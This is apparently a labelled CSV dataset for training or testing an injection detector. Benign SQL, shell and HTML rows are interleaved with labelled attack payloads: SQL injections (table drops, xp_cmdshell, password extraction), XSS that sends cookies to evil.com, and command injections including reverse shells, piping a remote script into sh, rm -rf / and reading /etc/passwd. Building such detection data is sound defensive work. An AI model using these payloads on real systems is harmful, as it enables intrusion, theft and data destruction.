id,payload,label
337,"<div class='user-profile'>Welcome back, {username}!</div>",benign
338,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
339,git clone https://github.com/user/repo.git,benign
340,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
341,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
342,curl -I https://api.example.com/status,benign
343,docker run nginx,benign
344,npm install express,benign
345,"<div class='user-profile'>Welcome back, {username}!</div>",benign
346,curl -I https://api.example.com/status,benign
347,npm install express,benign
348,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
349,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
350,docker run nginx,benign
351,"<div class='user-profile'>Welcome back, {username}!</div>",benign
352,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
353,git clone https://github.com/user/repo.git,benign
354,curl -I https://api.example.com/status,benign
355,npm install express,benign
356,docker run nginx,benign
357,SELECT price FROM items WHERE id = 209,benign
358,docker run nginx,benign
359,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
360,curl -I https://api.example.com/status,benign
361,admin' --,sql_injection
362,')) OR 1=1--,sql_injection
363,'; exec xp_cmdshell('net user'); --,sql_injection
364,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
365,'; DROP TABLE users; --,sql_injection
366,'; DROP TABLE users; --,sql_injection
367,"' UNION SELECT username,password FROM admin_users --",sql_injection
368,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
369,'; DROP TABLE users; --,sql_injection
370,'; DROP TABLE users; --,sql_injection
371,'; exec xp_cmdshell('net user'); --,sql_injection
372,'; WAITFOR DELAY '0:0:10'--,sql_injection
373,'; DROP TABLE users; --,sql_injection
374,')) OR 1=1--,sql_injection
375,'; WAITFOR DELAY '0:0:10'--,sql_injection
376,<iframe src='javascript:alert(`xss`)'></iframe>,xss
377,<input onfocus=write(1) autofocus>,xss
378,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
379,<iframe src='javascript:alert(`xss`)'></iframe>,xss
380,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
381,<img src=x onerror=alert('XSS')>,xss
382,<input onfocus=write(1) autofocus>,xss
383,<body onload=alert('XSS')>,xss
384,<iframe src='javascript:alert(`xss`)'></iframe>,xss
385,<iframe src='javascript:alert(`xss`)'></iframe>,xss
386,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
387,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
388,<body onload=alert('XSS')>,xss
389,<input onfocus=write(1) autofocus>,xss
390,<input onfocus=write(1) autofocus>,xss
391,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
392,|| echo 'evil' > script.sh,cmd_injection
393,; wget http://malicious.com/shell.php,cmd_injection
394,; wget http://malicious.com/shell.php,cmd_injection
395,`curl http://evil.com/script.sh | sh`,cmd_injection
396,; rm -rf /,cmd_injection
397,| cat /etc/passwd,cmd_injection
398,; rm -rf /,cmd_injection
399,; rm -rf /,cmd_injection
400,; wget http://malicious.com/shell.php,cmd_injection
401,SELECT price FROM items WHERE id = 209,benign
402,git clone https://github.com/user/repo.git,benign
403,git clone https://github.com/user/repo.git,benign
404,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
405,"<div class='user-profile'>Welcome back, {username}!</div>",benign
406,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
407,"<div class='user-profile'>Welcome back, {username}!</div>",benign
408,curl -I https://api.example.com/status,benign
409,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
410,docker run nginx,benign
411,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
412,git clone https://github.com/user/repo.git,benign
413,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
414,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
415,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
416,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
417,"<div class='user-profile'>Welcome back, {username}!</div>",benign
418,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
419,"<div class='user-profile'>Welcome back, {username}!</div>",benign
420,SELECT price FROM items WHERE id = 209,benign
421,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
422,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
423,docker run nginx,benign
424,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
425,SELECT price FROM items WHERE id = 209,benign
426,"<div class='user-profile'>Welcome back, {username}!</div>",benign
427,git clone https://github.com/user/repo.git,benign
428,"<div class='user-profile'>Welcome back, {username}!</div>",benign
429,docker run nginx,benign
430,curl -I https://api.example.com/status,benign
431,git clone https://github.com/user/repo.git,benign
432,curl -I https://api.example.com/status,benign
433,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
434,npm install express,benign
435,docker run nginx,benign
436,npm install express,benign
437,curl -I https://api.example.com/status,benign
438,git clone https://github.com/user/repo.git,benign
439,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
440,git clone https://github.com/user/repo.git,benign
441,git clone https://github.com/user/repo.git,benign
442,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
443,SELECT price FROM items WHERE id = 209,benign
444,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
445,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
446,docker run nginx,benign
447,docker run nginx,benign
448,"<div class='user-profile'>Welcome back, {username}!</div>",benign
449,curl -I https://api.example.com/status,benign
450,curl -I https://api.example.com/status,benign
451,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
452,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
453,git clone https://github.com/user/repo.git,benign
454,npm install express,benign
455,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
456,SELECT price FROM items WHERE id = 209,benign
457,npm install express,benign
458,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
459,curl -I https://api.example.com/status,benign
460,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
461,'; WAITFOR DELAY '0:0:10'--,sql_injection
462,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
463,'; WAITFOR DELAY '0:0:10'--,sql_injection
464,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
465,' OR '1'='1,sql_injection
466,'; DROP TABLE users; --,sql_injection
467,' OR 1=1 ORDER BY 1--,sql_injection
468,'; exec xp_cmdshell('net user'); --,sql_injection
469,'; WAITFOR DELAY '0:0:10'--,sql_injection
470,' OR 1=1 ORDER BY 1--,sql_injection
471,admin' --,sql_injection
472,' OR '1'='1,sql_injection
473,"' UNION SELECT username,password FROM admin_users --",sql_injection
474,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
475,'; DROP TABLE users; --,sql_injection
476,<img src=x onerror=alert('XSS')>,xss
477,<img src=x onerror=alert('XSS')>,xss
478,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
479,<img src=x onerror=alert('XSS')>,xss
480,<iframe src='javascript:alert(`xss`)'></iframe>,xss
481,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
482,<iframe src='javascript:alert(`xss`)'></iframe>,xss
483,<input onfocus=write(1) autofocus>,xss
484,<svg onload=alert(1)>,xss
485,<input onfocus=write(1) autofocus>,xss
486,<iframe src='javascript:alert(`xss`)'></iframe>,xss
487,javascript:alert(document.domain),xss
488,<iframe src='javascript:alert(`xss`)'></iframe>,xss
489,<iframe src='javascript:alert(`xss`)'></iframe>,xss
490,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
491,; rm -rf /,cmd_injection
492,|| echo 'evil' > script.sh,cmd_injection
493,`curl http://evil.com/script.sh | sh`,cmd_injection
494,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
495,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
496,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
497,& net user administrator /add,cmd_injection
498,| cat /etc/passwd,cmd_injection
499,`curl http://evil.com/script.sh | sh`,cmd_injection
500,; rm -rf /,cmd_injection
501,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
502,npm install express,benign
503,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
504,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
505,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
506,git clone https://github.com/user/repo.git,benign
507,git clone https://github.com/user/repo.git,benign
508,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
509,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
510,"<div class='user-profile'>Welcome back, {username}!</div>",benign
511,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
512,"<div class='user-profile'>Welcome back, {username}!</div>",benign
513,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
514,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
515,SELECT price FROM items WHERE id = 209,benign
516,git clone https://github.com/user/repo.git,benign
517,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
518,npm install express,benign
519,git clone https://github.com/user/repo.git,benign
520,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
521,npm install express,benign
522,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
523,docker run nginx,benign
524,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
525,curl -I https://api.example.com/status,benign
526,curl -I https://api.example.com/status,benign
527,curl -I https://api.example.com/status,benign
528,docker run nginx,benign
529,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
530,npm install express,benign
531,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
532,docker run nginx,benign
533,"<div class='user-profile'>Welcome back, {username}!</div>",benign
534,SELECT price FROM items WHERE id = 209,benign
535,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
536,git clone https://github.com/user/repo.git,benign
537,"<div class='user-profile'>Welcome back, {username}!</div>",benign
538,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
539,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
540,docker run nginx,benign
541,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
542,git clone https://github.com/user/repo.git,benign
543,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
544,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
545,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
546,docker run nginx,benign
547,git clone https://github.com/user/repo.git,benign
548,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
549,npm install express,benign
550,git clone https://github.com/user/repo.git,benign
551,docker run nginx,benign
552,docker run nginx,benign
553,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
554,"<div class='user-profile'>Welcome back, {username}!</div>",benign
555,docker run nginx,benign
556,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
557,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
558,docker run nginx,benign
559,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
560,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
561,'; exec xp_cmdshell('net user'); --,sql_injection
562,"' UNION SELECT username,password FROM admin_users --",sql_injection
563,'; WAITFOR DELAY '0:0:10'--,sql_injection
564,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
565,'; WAITFOR DELAY '0:0:10'--,sql_injection
566,admin' --,sql_injection
567,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
568,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
569,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
570,'; DROP TABLE users; --,sql_injection
571,')) OR 1=1--,sql_injection
572,'; exec xp_cmdshell('net user'); --,sql_injection
573,'; exec xp_cmdshell('net user'); --,sql_injection
574,' OR 1=1 ORDER BY 1--,sql_injection
575,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
576,javascript:alert(document.domain),xss
577,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
578,<input onfocus=write(1) autofocus>,xss
579,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
580,<script>alert(document.cookie)</script>,xss
581,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
582,<script>alert(document.cookie)</script>,xss
583,<svg onload=alert(1)>,xss
584,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
585,<script>alert(document.cookie)</script>,xss
586,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
587,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
588,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
589,javascript:alert(document.domain),xss
590,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
591,| cat /etc/passwd,cmd_injection
592,| cat /etc/passwd,cmd_injection
593,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
594,`curl http://evil.com/script.sh | sh`,cmd_injection
595,| cat /etc/passwd,cmd_injection
596,& net user administrator /add,cmd_injection
597,& net user administrator /add,cmd_injection
598,; wget http://malicious.com/shell.php,cmd_injection
599,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
600,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
601,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
602,docker run nginx,benign
603,docker run nginx,benign
604,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
605,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
606,npm install express,benign
607,docker run nginx,benign
608,"<div class='user-profile'>Welcome back, {username}!</div>",benign
609,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
610,npm install express,benign
611,SELECT price FROM items WHERE id = 209,benign
612,SELECT price FROM items WHERE id = 209,benign
613,SELECT price FROM items WHERE id = 209,benign
614,SELECT price FROM items WHERE id = 209,benign
615,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
616,git clone https://github.com/user/repo.git,benign
617,docker run nginx,benign
618,git clone https://github.com/user/repo.git,benign
619,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
620,"<div class='user-profile'>Welcome back, {username}!</div>",benign
621,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
622,"<div class='user-profile'>Welcome back, {username}!</div>",benign
623,"<div class='user-profile'>Welcome back, {username}!</div>",benign
624,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
625,curl -I https://api.example.com/status,benign
626,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
627,docker run nginx,benign
628,SELECT price FROM items WHERE id = 209,benign
629,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
630,git clone https://github.com/user/repo.git,benign
631,docker run nginx,benign
632,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
633,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
634,git clone https://github.com/user/repo.git,benign
635,curl -I https://api.example.com/status,benign
636,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
637,"<div class='user-profile'>Welcome back, {username}!</div>",benign
638,docker run nginx,benign
639,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
640,"<div class='user-profile'>Welcome back, {username}!</div>",benign
641,curl -I https://api.example.com/status,benign
642,"<div class='user-profile'>Welcome back, {username}!</div>",benign
643,curl -I https://api.example.com/status,benign
644,npm install express,benign
645,git clone https://github.com/user/repo.git,benign
646,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
647,npm install express,benign
648,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
649,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
650,git clone https://github.com/user/repo.git,benign
651,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
652,npm install express,benign
653,SELECT price FROM items WHERE id = 209,benign
654,git clone https://github.com/user/repo.git,benign
655,SELECT price FROM items WHERE id = 209,benign
656,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
657,git clone https://github.com/user/repo.git,benign
658,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
659,"<div class='user-profile'>Welcome back, {username}!</div>",benign
660,git clone https://github.com/user/repo.git,benign
661,'; exec xp_cmdshell('net user'); --,sql_injection
662,'; DROP TABLE users; --,sql_injection
663,'; exec xp_cmdshell('net user'); --,sql_injection
664,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
665,'; DROP TABLE users; --,sql_injection
666,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
667,' OR 1=1 ORDER BY 1--,sql_injection
668,"' UNION SELECT username,password FROM admin_users --",sql_injection
669,"' UNION SELECT username,password FROM admin_users --",sql_injection
670,'; exec xp_cmdshell('net user'); --,sql_injection
671,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
672,"' UNION SELECT username,password FROM admin_users --",sql_injection
673,'; WAITFOR DELAY '0:0:10'--,sql_injection
674,admin' --,sql_injection
675,' OR '1'='1,sql_injection
